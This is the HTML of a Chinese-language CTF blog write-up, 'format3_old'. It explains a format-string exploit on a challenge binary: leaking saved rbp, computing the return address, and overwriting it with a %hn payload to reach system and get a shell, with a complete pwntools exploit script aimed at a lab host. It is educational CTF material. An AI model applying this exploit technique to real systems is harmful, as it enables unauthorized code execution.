@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>format3_old | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="首先查看保护机制：
+可以看到got表不能修改，没有栈溢出检查和地址随机化
+按照之前的流程，我们接下来会将程序拖入IDA中查看，但是这个程序在拖入IDA之前，我建议先运行一下，查看一下程序的流程。这样做的原因是，这道题有着较多功能函数，如果直接放入IDA，容易被绕晕。
+运行程序首先是打印几排字符串，让我们先注册：
+我们注册后会显示注册成功：
+然后跳出菜单让我们选择：
+三个选项，如果输入1，就会显示我们刚刚注册的账户：
+如果选择2，则会让我们重新输入username和password：
+如果选择3，则会退出。
+然后我们再进入IDA中查看：
+这里我已经将大部分函数按照其功能重新命名（注：这里我将打印username和password的函数取名为show）。
+通过刚刚的运行，我们知道了，程序会让我们首先注册，然后如果我们选择1.Sh0w Account Infomation!，程序就会将我们输入的账户和密码输出出来。那么在这个地方，就可能存在格式化字符串漏洞。
+我们在IDA中找到输出账户和密码的函数：
+可以看到，这个函数有两个printf函数，那么这里就可以利用格式化字符串漏洞。
+同时，我们可以在IDA中找到，system函数：
+然后我们进入gdb，断点打在show函数处，查看偏移量：
+可以看到，我们输入的字符串在第8个偏移量（0x7fffffffdcd0）。同时根据函数调用的知识，我们可以判断，第7个偏移量为show函数的返回值，第6个偏移量为上一个函数的rbp。如果可以修改这个返回值到system函数，那么我们就可getshell。
+那么怎么修改返回值呢，我们可以使用修改got表的方式，来修改内存，我们只需要找到存放返回值的内存地址，就可以修改返回地址。
+我们知道每次程序运行时内存地址是不固定的，但是根据函数调用的知识，我们知道，返回地址和存放上一个函数rbp的位置是固定的。那就是上面说到的第7个偏移量和第6个偏移量。然后我们利用第6个偏移量所存放的值(0x7fffffffdd00)，减去返回值所在的栈地址(0x7fffffffdcc8)：
+0x7fffffffdd00 - 0x7fffffffdcc8 = 0x38 这样我们就得到了返回值所在的地址。
+所以这里我们先泄露第6个偏移量的值，得到上一个函数的rbp，然后减去0x38，就是返回值所在的地址。
+from pwn import *context.log_level=&#34;debug&#34;#p=process(&#34;./format3&#34;)p = remote(&#39;10.0.25.109&#39;,20003)binary=ELF(&#34;format3&#34;)#gdb.attach(sh)p.recvuntil(&#39;Input your username(max lenth:20):&#39;)p.sendline(&#39;.tmp&#39;)p.recvuntil(&#39;Input your password(max lenth:20):&#39;)p.sendline(&#39;%6$p&#39;)p.recvuntil(&#39;Register Success!!\n&#39;)p.sendline(&#39;1&#39;)p.recvuntil(&#39;.tmp\n&#39;)rbp = int(p.recvline(),base = 16)print(&#39;rbp = &#39;,hex(rbp))ret_addr = rbp - 0x38print(&#39;ret_addr = &#39;,hex(ret_addr)) 得到返回值地址后，我们就要利用格式化字符串修改返回值。">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/ctf/format3_old/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="format3_old" />
+<meta property="og:description" content="首先查看保护机制：
+可以看到got表不能修改，没有栈溢出检查和地址随机化
+按照之前的流程，我们接下来会将程序拖入IDA中查看，但是这个程序在拖入IDA之前，我建议先运行一下，查看一下程序的流程。这样做的原因是，这道题有着较多功能函数，如果直接放入IDA，容易被绕晕。
+运行程序首先是打印几排字符串，让我们先注册：
+我们注册后会显示注册成功：
+然后跳出菜单让我们选择：
+三个选项，如果输入1，就会显示我们刚刚注册的账户：
+如果选择2，则会让我们重新输入username和password：
+如果选择3，则会退出。
+然后我们再进入IDA中查看：
+这里我已经将大部分函数按照其功能重新命名（注：这里我将打印username和password的函数取名为show）。
+通过刚刚的运行，我们知道了，程序会让我们首先注册，然后如果我们选择1.Sh0w Account Infomation!，程序就会将我们输入的账户和密码输出出来。那么在这个地方，就可能存在格式化字符串漏洞。
+我们在IDA中找到输出账户和密码的函数：
+可以看到，这个函数有两个printf函数，那么这里就可以利用格式化字符串漏洞。
+同时，我们可以在IDA中找到，system函数：
+然后我们进入gdb，断点打在show函数处，查看偏移量：
+可以看到，我们输入的字符串在第8个偏移量（0x7fffffffdcd0）。同时根据函数调用的知识，我们可以判断，第7个偏移量为show函数的返回值，第6个偏移量为上一个函数的rbp。如果可以修改这个返回值到system函数，那么我们就可getshell。
+那么怎么修改返回值呢，我们可以使用修改got表的方式，来修改内存，我们只需要找到存放返回值的内存地址，就可以修改返回地址。
+我们知道每次程序运行时内存地址是不固定的，但是根据函数调用的知识，我们知道，返回地址和存放上一个函数rbp的位置是固定的。那就是上面说到的第7个偏移量和第6个偏移量。然后我们利用第6个偏移量所存放的值(0x7fffffffdd00)，减去返回值所在的栈地址(0x7fffffffdcc8)：
+0x7fffffffdd00 - 0x7fffffffdcc8 = 0x38 这样我们就得到了返回值所在的地址。
+所以这里我们先泄露第6个偏移量的值，得到上一个函数的rbp，然后减去0x38，就是返回值所在的地址。
+from pwn import *context.log_level=&#34;debug&#34;#p=process(&#34;./format3&#34;)p = remote(&#39;10.0.25.109&#39;,20003)binary=ELF(&#34;format3&#34;)#gdb.attach(sh)p.recvuntil(&#39;Input your username(max lenth:20):&#39;)p.sendline(&#39;.tmp&#39;)p.recvuntil(&#39;Input your password(max lenth:20):&#39;)p.sendline(&#39;%6$p&#39;)p.recvuntil(&#39;Register Success!!\n&#39;)p.sendline(&#39;1&#39;)p.recvuntil(&#39;.tmp\n&#39;)rbp = int(p.recvline(),base = 16)print(&#39;rbp = &#39;,hex(rbp))ret_addr = rbp - 0x38print(&#39;ret_addr = &#39;,hex(ret_addr)) 得到返回值地址后，我们就要利用格式化字符串修改返回值。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/ctf/format3_old/" /><meta property="article:section" content="ctf" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="format3_old"/>
+<meta name="twitter:description" content="首先查看保护机制：
+可以看到got表不能修改，没有栈溢出检查和地址随机化
+按照之前的流程，我们接下来会将程序拖入IDA中查看，但是这个程序在拖入IDA之前，我建议先运行一下，查看一下程序的流程。这样做的原因是，这道题有着较多功能函数，如果直接放入IDA，容易被绕晕。
+运行程序首先是打印几排字符串，让我们先注册：
+我们注册后会显示注册成功：
+然后跳出菜单让我们选择：
+三个选项，如果输入1，就会显示我们刚刚注册的账户：
+如果选择2，则会让我们重新输入username和password：
+如果选择3，则会退出。
+然后我们再进入IDA中查看：
+这里我已经将大部分函数按照其功能重新命名（注：这里我将打印username和password的函数取名为show）。
+通过刚刚的运行，我们知道了，程序会让我们首先注册，然后如果我们选择1.Sh0w Account Infomation!，程序就会将我们输入的账户和密码输出出来。那么在这个地方，就可能存在格式化字符串漏洞。
+我们在IDA中找到输出账户和密码的函数：
+可以看到，这个函数有两个printf函数，那么这里就可以利用格式化字符串漏洞。
+同时，我们可以在IDA中找到，system函数：
+然后我们进入gdb，断点打在show函数处，查看偏移量：
+可以看到，我们输入的字符串在第8个偏移量（0x7fffffffdcd0）。同时根据函数调用的知识，我们可以判断，第7个偏移量为show函数的返回值，第6个偏移量为上一个函数的rbp。如果可以修改这个返回值到system函数，那么我们就可getshell。
+那么怎么修改返回值呢，我们可以使用修改got表的方式，来修改内存，我们只需要找到存放返回值的内存地址，就可以修改返回地址。
+我们知道每次程序运行时内存地址是不固定的，但是根据函数调用的知识，我们知道，返回地址和存放上一个函数rbp的位置是固定的。那就是上面说到的第7个偏移量和第6个偏移量。然后我们利用第6个偏移量所存放的值(0x7fffffffdd00)，减去返回值所在的栈地址(0x7fffffffdcc8)：
+0x7fffffffdd00 - 0x7fffffffdcc8 = 0x38 这样我们就得到了返回值所在的地址。
+所以这里我们先泄露第6个偏移量的值，得到上一个函数的rbp，然后减去0x38，就是返回值所在的地址。
+from pwn import *context.log_level=&#34;debug&#34;#p=process(&#34;./format3&#34;)p = remote(&#39;10.0.25.109&#39;,20003)binary=ELF(&#34;format3&#34;)#gdb.attach(sh)p.recvuntil(&#39;Input your username(max lenth:20):&#39;)p.sendline(&#39;.tmp&#39;)p.recvuntil(&#39;Input your password(max lenth:20):&#39;)p.sendline(&#39;%6$p&#39;)p.recvuntil(&#39;Register Success!!\n&#39;)p.sendline(&#39;1&#39;)p.recvuntil(&#39;.tmp\n&#39;)rbp = int(p.recvline(),base = 16)print(&#39;rbp = &#39;,hex(rbp))ret_addr = rbp - 0x38print(&#39;ret_addr = &#39;,hex(ret_addr)) 得到返回值地址后，我们就要利用格式化字符串修改返回值。"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ctf",
+      "item": "https://jellyfish-pro.github.io/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "format3_old",
+      "item": "https://jellyfish-pro.github.io/ctf/format3_old/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "format3_old",
+  "name": "format3_old",
+  "description": "首先查看保护机制：\n可以看到got表不能修改，没有栈溢出检查和地址随机化\n按照之前的流程，我们接下来会将程序拖入IDA中查看，但是这个程序在拖入IDA之前，我建议先运行一下，查看一下程序的流程。这样做的原因是，这道题有着较多功能函数，如果直接放入IDA，容易被绕晕。\n运行程序首先是打印几排字符串，让我们先注册：\n我们注册后会显示注册成功：\n然后跳出菜单让我们选择：\n三个选项，如果输入1，就会显示我们刚刚注册的账户：\n如果选择2，则会让我们重新输入username和password：\n如果选择3，则会退出。\n然后我们再进入IDA中查看：\n这里我已经将大部分函数按照其功能重新命名（注：这里我将打印username和password的函数取名为show）。\n通过刚刚的运行，我们知道了，程序会让我们首先注册，然后如果我们选择1.Sh0w Account Infomation!，程序就会将我们输入的账户和密码输出出来。那么在这个地方，就可能存在格式化字符串漏洞。\n我们在IDA中找到输出账户和密码的函数：\n可以看到，这个函数有两个printf函数，那么这里就可以利用格式化字符串漏洞。\n同时，我们可以在IDA中找到，system函数：\n然后我们进入gdb，断点打在show函数处，查看偏移量：\n可以看到，我们输入的字符串在第8个偏移量（0x7fffffffdcd0）。同时根据函数调用的知识，我们可以判断，第7个偏移量为show函数的返回值，第6个偏移量为上一个函数的rbp。如果可以修改这个返回值到system函数，那么我们就可getshell。\n那么怎么修改返回值呢，我们可以使用修改got表的方式，来修改内存，我们只需要找到存放返回值的内存地址，就可以修改返回地址。\n我们知道每次程序运行时内存地址是不固定的，但是根据函数调用的知识，我们知道，返回地址和存放上一个函数rbp的位置是固定的。那就是上面说到的第7个偏移量和第6个偏移量。然后我们利用第6个偏移量所存放的值(0x7fffffffdd00)，减去返回值所在的栈地址(0x7fffffffdcc8)：\n0x7fffffffdd00 - 0x7fffffffdcc8 = 0x38 这样我们就得到了返回值所在的地址。\n所以这里我们先泄露第6个偏移量的值，得到上一个函数的rbp，然后减去0x38，就是返回值所在的地址。\nfrom pwn import *\rcontext.log_level=\u0026#34;debug\u0026#34;\r#p=process(\u0026#34;./format3\u0026#34;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,20003)\rbinary=ELF(\u0026#34;format3\u0026#34;)\r#gdb.attach(sh)\rp.recvuntil(\u0026#39;Input your username(max lenth:20):\u0026#39;)\rp.sendline(\u0026#39;.tmp\u0026#39;)\rp.recvuntil(\u0026#39;Input your password(max lenth:20):\u0026#39;)\rp.sendline(\u0026#39;%6$p\u0026#39;)\rp.recvuntil(\u0026#39;Register Success!!\\n\u0026#39;)\rp.sendline(\u0026#39;1\u0026#39;)\rp.recvuntil(\u0026#39;.tmp\\n\u0026#39;)\rrbp = int(p.recvline(),base = 16)\rprint(\u0026#39;rbp = \u0026#39;,hex(rbp))\rret_addr = rbp - 0x38\rprint(\u0026#39;ret_addr = \u0026#39;,hex(ret_addr)) 得到返回值地址后，我们就要利用格式化字符串修改返回值。",
+  "keywords": [
+    
+  ],
+  "articleBody": "首先查看保护机制：\n可以看到got表不能修改，没有栈溢出检查和地址随机化\n按照之前的流程，我们接下来会将程序拖入IDA中查看，但是这个程序在拖入IDA之前，我建议先运行一下，查看一下程序的流程。这样做的原因是，这道题有着较多功能函数，如果直接放入IDA，容易被绕晕。\n运行程序首先是打印几排字符串，让我们先注册：\n我们注册后会显示注册成功：\n然后跳出菜单让我们选择：\n三个选项，如果输入1，就会显示我们刚刚注册的账户：\n如果选择2，则会让我们重新输入username和password：\n如果选择3，则会退出。\n然后我们再进入IDA中查看：\n这里我已经将大部分函数按照其功能重新命名（注：这里我将打印username和password的函数取名为show）。\n通过刚刚的运行，我们知道了，程序会让我们首先注册，然后如果我们选择1.Sh0w Account Infomation!，程序就会将我们输入的账户和密码输出出来。那么在这个地方，就可能存在格式化字符串漏洞。\n我们在IDA中找到输出账户和密码的函数：\n可以看到，这个函数有两个printf函数，那么这里就可以利用格式化字符串漏洞。\n同时，我们可以在IDA中找到，system函数：\n然后我们进入gdb，断点打在show函数处，查看偏移量：\n可以看到，我们输入的字符串在第8个偏移量（0x7fffffffdcd0）。同时根据函数调用的知识，我们可以判断，第7个偏移量为show函数的返回值，第6个偏移量为上一个函数的rbp。如果可以修改这个返回值到system函数，那么我们就可getshell。\n那么怎么修改返回值呢，我们可以使用修改got表的方式，来修改内存，我们只需要找到存放返回值的内存地址，就可以修改返回地址。\n我们知道每次程序运行时内存地址是不固定的，但是根据函数调用的知识，我们知道，返回地址和存放上一个函数rbp的位置是固定的。那就是上面说到的第7个偏移量和第6个偏移量。然后我们利用第6个偏移量所存放的值(0x7fffffffdd00)，减去返回值所在的栈地址(0x7fffffffdcc8)：\n0x7fffffffdd00 - 0x7fffffffdcc8 = 0x38 这样我们就得到了返回值所在的地址。\n所以这里我们先泄露第6个偏移量的值，得到上一个函数的rbp，然后减去0x38，就是返回值所在的地址。\nfrom pwn import *\rcontext.log_level=\"debug\"\r#p=process(\"./format3\")\rp = remote('10.0.25.109',20003)\rbinary=ELF(\"format3\")\r#gdb.attach(sh)\rp.recvuntil('Input your username(max lenth:20):')\rp.sendline('.tmp')\rp.recvuntil('Input your password(max lenth:20):')\rp.sendline('%6$p')\rp.recvuntil('Register Success!!\\n')\rp.sendline('1')\rp.recvuntil('.tmp\\n')\rrbp = int(p.recvline(),base = 16)\rprint('rbp = ',hex(rbp))\rret_addr = rbp - 0x38\rprint('ret_addr = ',hex(ret_addr)) 得到返回值地址后，我们就要利用格式化字符串修改返回值。\n我们需要将0x400d74改为0x4008A6\n因为只有最后两个字节不同，所以我们使用\n$hn 又因为我们需要将0x0d74改为0x08A6，所以我们需要输出0x08A6个字符，也就是2214个字符\n%2214c$hn 完整的exp：\n#format3\rfrom pwn import *\rcontext.log_level=\"debug\"\r#p=process(\"./format3\")\rp = remote('10.0.25.109',20003)\rbinary=ELF(\"format3\")\r#gdb.attach(sh)\rp.recvuntil('Input your username(max lenth:20):')\rp.sendline('.tmp')\rp.recvuntil('Input your password(max lenth:20):')\rp.sendline('%6$p')\rp.recvuntil('Register Success!!\\n')\rp.sendline('1')\rp.recvuntil('.tmp\\n')\rrbp = int(p.recvline(),base = 16)\rprint('rbp = ',hex(rbp))\rret_addr = rbp - 0x38\rprint('ret_addr = ',hex(ret_addr))\r#---------------------------第二次输入---------------------------------\rp.sendline('2')\rp.recvuntil('please input new username(max lenth:20):')\rp.sendline(p64(ret_addr))\rp.recvuntil('please input new password(max lenth:20):')\rp.writeline(\"%2214c%8$hn\")\r#---------------------------第三次输入---------------------------------\rp.sendline('1')\rp.interactive() ",
+  "wordCount" : "135",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "shangdi4sb"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://jellyfish-pro.github.io/ctf/format3_old/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "CAI dog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://jellyfish-pro.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span>ctf</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a>&nbsp;»&nbsp;<a href="https://jellyfish-pro.github.io/ctf/">ctf</a></div>
+    <h1 class="post-title">
+      format3_old
+    </h1>
+    <div class="post-meta">1 min&nbsp;·&nbsp;shangdi4sb
+
+</div>
+  </header> 
+
+  <div class="post-content"><p>首先查看保护机制：</p>
+<p><img loading="lazy" src="/ctf/format3.img/image-20220424171435806.png" alt="image-20220424171435806"  />
+</p>
+<p>可以看到got表不能修改，没有栈溢出检查和地址随机化</p>
+<p>按照之前的流程，我们接下来会将程序拖入IDA中查看，但是这个程序在拖入IDA之前，我建议先运行一下，查看一下程序的流程。这样做的原因是，这道题有着较多功能函数，如果直接放入IDA，容易被绕晕。</p>
+<p>运行程序首先是打印几排字符串，让我们先注册：</p>
+<p><img loading="lazy" src="/ctf/format3.img/image-20220424173423695.png" alt="image-20220424173423695"  />
+</p>
+<p>我们注册后会显示注册成功：</p>
+<p><img loading="lazy" src="/ctf/format3.img/image-20220424173456152.png" alt="image-20220424173456152"  />
+</p>
+<p>然后跳出菜单让我们选择：</p>
+<p><img loading="lazy" src="/ctf/format3.img/image-20220424173518496.png" alt="image-20220424173518496"  />
+</p>
+<p>三个选项，如果输入1，就会显示我们刚刚注册的账户：</p>
+<p><img loading="lazy" src="/ctf/format3.img/image-20220424173642697.png" alt="image-20220424173642697"  />
+</p>
+<p>如果选择2，则会让我们重新输入username和password：</p>
+<p><img loading="lazy" src="/ctf/format3.img/image-20220424173727540.png" alt="image-20220424173727540"  />
+</p>
+<p>如果选择3，则会退出。</p>
+<p>然后我们再进入IDA中查看：</p>
+<p><img loading="lazy" src="/ctf/format3.img/image-20220424173859914.png" alt="image-20220424173859914"  />
+</p>
+<p>这里我已经将大部分函数按照其功能重新命名（<strong>注：这里我将打印username和password的函数取名为show</strong>）。</p>
+<p>通过刚刚的运行，我们知道了，程序会让我们首先注册，然后如果我们选择<strong>1.Sh0w Account Infomation!</strong>，程序就会将我们输入的账户和密码输出出来。那么在这个地方，就可能存在格式化字符串漏洞。</p>
+<p>我们在IDA中找到输出账户和密码的函数：</p>
+<p><img loading="lazy" src="/ctf/format3.img/image-20220424174340605.png" alt="image-20220424174340605"  />
+</p>
+<p>可以看到，这个函数有两个printf函数，那么这里就可以利用格式化字符串漏洞。</p>
+<p>同时，我们可以在IDA中找到，system函数：</p>
+<p><img loading="lazy" src="/ctf/format3.img/image-20220424180236545.png" alt="image-20220424180236545"  />
+</p>
+<p>然后我们进入gdb，断点打在show函数处，查看偏移量：</p>
+<p><img loading="lazy" src="/ctf/format3.img/image-20220424175409738.png" alt="image-20220424175409738"  />
+</p>
+<p>可以看到，我们输入的字符串在第8个偏移量（0x7fffffffdcd0）。同时根据函数调用的知识，我们可以判断，第7个偏移量为show函数的返回值，第6个偏移量为上一个函数的rbp。如果可以修改这个返回值到system函数，那么我们就可getshell。</p>
+<p>那么怎么修改返回值呢，我们可以使用修改got表的方式，来修改内存，我们只需要找到存放返回值的内存地址，就可以修改返回地址。</p>
+<p>我们知道每次程序运行时内存地址是不固定的，但是根据函数调用的知识，我们知道，返回地址和存放上一个函数rbp的位置是固定的。那就是上面说到的第7个偏移量和第6个偏移量。然后我们利用第6个偏移量所存放的值(0x7fffffffdd00)，减去返回值所在的栈地址(0x7fffffffdcc8)：</p>
+<pre tabindex="0"><code>0x7fffffffdd00 - 0x7fffffffdcc8 = 0x38
+</code></pre><p>这样我们就得到了返回值所在的地址。</p>
+<p>所以这里我们先泄露第6个偏移量的值，得到上一个函数的rbp，然后减去0x38，就是返回值所在的地址。</p>
+<pre tabindex="0"><code>from pwn import *
+context.log_level=&#34;debug&#34;
+
+
+#p=process(&#34;./format3&#34;)
+p = remote(&#39;10.0.25.109&#39;,20003)
+binary=ELF(&#34;format3&#34;)
+#gdb.attach(sh)
+
+p.recvuntil(&#39;Input your username(max lenth:20):&#39;)
+p.sendline(&#39;.tmp&#39;)
+p.recvuntil(&#39;Input your password(max lenth:20):&#39;)
+p.sendline(&#39;%6$p&#39;)
+p.recvuntil(&#39;Register Success!!\n&#39;)
+p.sendline(&#39;1&#39;)
+
+p.recvuntil(&#39;.tmp\n&#39;)
+
+rbp = int(p.recvline(),base = 16)
+
+print(&#39;rbp = &#39;,hex(rbp))
+
+ret_addr = rbp - 0x38
+
+print(&#39;ret_addr = &#39;,hex(ret_addr))
+</code></pre><p>得到返回值地址后，我们就要利用格式化字符串修改返回值。</p>
+<p>我们需要将0x400d74改为0x4008A6</p>
+<p>因为只有最后两个字节不同，所以我们使用</p>
+<pre tabindex="0"><code>$hn
+</code></pre><p>又因为我们需要将0x0d74改为0x08A6，所以我们需要输出0x08A6个字符，也就是2214个字符</p>
+<pre tabindex="0"><code>%2214c$hn
+</code></pre><p>完整的exp：</p>
+<pre tabindex="0"><code>#format3
+from pwn import *
+context.log_level=&#34;debug&#34;
+
+
+#p=process(&#34;./format3&#34;)
+p = remote(&#39;10.0.25.109&#39;,20003)
+binary=ELF(&#34;format3&#34;)
+#gdb.attach(sh)
+
+p.recvuntil(&#39;Input your username(max lenth:20):&#39;)
+p.sendline(&#39;.tmp&#39;)
+p.recvuntil(&#39;Input your password(max lenth:20):&#39;)
+p.sendline(&#39;%6$p&#39;)
+p.recvuntil(&#39;Register Success!!\n&#39;)
+p.sendline(&#39;1&#39;)
+
+p.recvuntil(&#39;.tmp\n&#39;)
+
+rbp = int(p.recvline(),base = 16)
+
+print(&#39;rbp = &#39;,hex(rbp))
+
+ret_addr = rbp - 0x38
+
+print(&#39;ret_addr = &#39;,hex(ret_addr))
+
+
+#---------------------------第二次输入---------------------------------
+
+p.sendline(&#39;2&#39;)
+p.recvuntil(&#39;please input new username(max lenth:20):&#39;)
+p.sendline(p64(ret_addr))
+p.recvuntil(&#39;please input new password(max lenth:20):&#39;)
+p.writeline(&#34;%2214c%8$hn&#34;)
+
+
+
+#---------------------------第三次输入---------------------------------
+
+p.sendline(&#39;1&#39;)
+
+p.interactive()
+</code></pre><p><img loading="lazy" src="/ctf/format3.img/image-20220425095506375.png" alt="image-20220425095506375"  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://jellyfish-pro.github.io/ctf/format3_new/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>format3_new</span>
+  </a>
+  <a class="next" href="https://jellyfish-pro.github.io/ctf/format4_new/">
+    <span class="title">Next »</span>
+    <br>
+    <span>format4_new</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
